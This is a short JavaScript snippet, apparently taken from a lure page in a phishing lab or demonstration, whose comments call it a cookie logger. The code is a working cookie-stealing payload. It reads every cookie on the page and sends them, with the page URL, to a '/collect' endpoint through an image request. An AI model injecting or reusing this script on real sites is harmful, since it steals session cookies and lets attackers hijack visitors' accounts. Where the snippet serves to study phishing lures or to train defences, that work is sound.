// Cookie logger, as found on the lure page. Sends this page's cookies to the
// collector. On this instance the collector is the instance itself.
(function () {
  var c = document.cookie;
  if (c) new Image().src = "/collect?c=" + encodeURIComponent(c) + "&u=" + encodeURIComponent(location.href);
})();
